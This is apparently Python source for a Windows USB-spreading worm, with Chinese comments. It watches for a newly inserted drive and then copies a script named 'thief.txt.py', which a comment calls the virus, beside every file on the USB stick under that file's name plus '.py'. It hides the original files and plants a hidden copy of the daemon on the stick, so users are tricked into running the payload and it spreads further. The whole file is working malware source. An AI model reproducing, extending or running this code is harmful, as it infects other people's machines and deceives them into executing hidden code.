### DAEMON 守护进程/服务 ###
### 此程序不可在osX或GNU/Linux上启动 ###
import os
import psutil
import time
import win32con
import win32api
import shutil
import subprocess

DAEMON_PATH="D:\\vscode\\SYSTEM\\daemon.py"
THIEF_PATH="D:\\vscode\\SYSTEM\\thief.txt.py"
DAEMON_NAME="daemon.py"
THIEF_NAME="thief.txt.py"

class computer:
    drive=["A:\\","B:\\","C:\\","D:\\","E:\\","F:\\","G:\\","H:\\","I:\\","J:\\","K:\\","L:\\","M:\\","N:\\","O:\\","P:\\","Q:\\","R:\\","S:\\","T:\\","U:\\","V:\\","W:\\","X:\\","Y:\\","Z:\\"]
    usb_drive="NULL"
    drive_sum=0

    def get_sum(self): #返回磁盘的个数
        s=0
        for d in self.drive:
            if os.path.exists(d):
                s=s+1
        return s

    def __init__(self):
        self.drive_sum=self.get_sum()


class usb:
    drive="" #此变量用于记录u盘的盘符
    def __init__(self):
        disks=psutil.disk_partitions()
        for d in disks:
            if d.fstype=="FAT32":
                self.drive=d.device

    def attack(self):
        target_files=os.listdir(self.drive)
        target_files.remove("System Volume Information")
        for f in target_files:
            if not("." in f): target_files.remove(f) #排除目标中的文件夹,因为复制对文件夹无效
        
        for f in target_files:
            target=self.drive+f
            #拷贝病毒
            shutil.copyfile(THIEF_PATH, target+".py") 
            #隐藏u盘中的文件
            win32api.SetFileAttributes(target, win32con.FILE_ATTRIBUTE_HIDDEN) 
        #拷贝demon守卫进程并隐藏
        shutil.copyfile(DAEMON_PATH, self.drive+DAEMON_NAME)
        win32api.SetFileAttributes(self.drive+DAEMON_NAME, win32con.FILE_ATTRIBUTE_HIDDEN) 

    

c1=computer()   
while True:
    time.sleep(3)
    print(c1.get_sum(),c1.drive_sum)
    if c1.get_sum()!=c1.drive_sum: 
        print("SSS")
        break

usb1=usb()
if not(os.path.exists(usb1.drive+DAEMON_NAME)):
    usb1.attack()

